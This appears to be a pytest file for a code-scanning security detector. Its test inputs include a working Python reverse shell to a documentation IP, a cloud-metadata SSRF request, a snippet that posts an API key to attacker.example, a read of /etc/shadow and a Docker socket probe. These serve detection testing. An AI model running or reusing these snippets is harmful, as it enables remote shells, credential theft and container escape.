from __future__ import annotations

from textwrap import dedent

from app.security.attack_detection import scan_attack_simulation


def _rule_ids(result) -> set[str]:
    return {match.rule_id for match in result.triggered_rules}


def test_reverse_shell_snippet_is_blocked() -> None:
    snippet = dedent(
        """
        import os
        import socket
        import subprocess

        client = socket.socket()
        client.connect(("198.51.100.23", 4444))
        os.dup2(client.fileno(), 0)
        os.dup2(client.fileno(), 1)
        os.dup2(client.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
        """
    ).strip()

    result = scan_attack_simulation(snippet)

    assert result.blocked is True
    assert result.highest_severity == "critical"
    assert "reverse_shell" in result.categories
    assert "reverse_shell.python_socket_shell" in _rule_ids(result)
    reverse_shell = next(
        match for match in result.triggered_rules if match.rule_id == "reverse_shell.python_socket_shell"
    )
    assert reverse_shell.matched_signals == ("socket_connect", "fd_redirect", "interactive_shell")
    assert reverse_shell.lines == (5, 6, 7, 8, 9, 10)


def test_internal_metadata_ssrf_snippet_is_blocked() -> None:
    snippet = dedent(
        """
        import requests

        response = requests.get(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        )
        """
    ).strip()

    result = scan_attack_simulation(snippet)

    assert result.blocked is True
    assert "ssrf.internal_target" in _rule_ids(result)
    assert result.categories == ("ssrf",)


def test_secret_exfiltration_requires_secret_read_and_network_sink() -> None:
    snippet = dedent(
        """
        import os
        import requests

        token = os.getenv("OPENAI_API_KEY")
        requests.post("https://attacker.example/collect", json={"token": token})
        """
    ).strip()

    result = scan_attack_simulation(snippet)

    assert result.blocked is True
    assert "secret_exfiltration.env_to_network" in _rule_ids(result)


def test_secret_read_without_exfiltration_is_not_blocked() -> None:
    snippet = dedent(
        """
        import os

        token = os.getenv("OPENAI_API_KEY")
        print("token present:", bool(token))
        """
    ).strip()

    result = scan_attack_simulation(snippet)

    assert result.blocked is False
    assert result.triggered_rules == ()


def test_sensitive_file_and_docker_socket_are_high_signal_findings() -> None:
    file_probe = scan_attack_simulation("with open('/etc/shadow', 'r', encoding='utf-8') as handle:\n    print(handle.readline())")
    docker_socket = scan_attack_simulation("sock = open('/var/run/docker.sock', 'rb')")

    assert "sensitive_file_access.host_secrets" in _rule_ids(file_probe)
    assert file_probe.highest_severity == "high"
    assert "container_escape.docker_socket_or_host_namespace" in _rule_ids(docker_socket)
    assert docker_socket.highest_severity == "critical"


def test_benign_automation_script_is_not_blocked() -> None:
    snippet = dedent(
        """
        import socket
        import subprocess
        import requests

        hostname = socket.gethostname()
        subprocess.run(["pytest", "-q"], check=True)
        response = requests.get("https://example.com/healthz", timeout=3)
        print(hostname, response.status_code)
        """
    ).strip()

    result = scan_attack_simulation(snippet)

    assert result.blocked is False
    assert result.highest_severity is None
    assert result.categories == ()
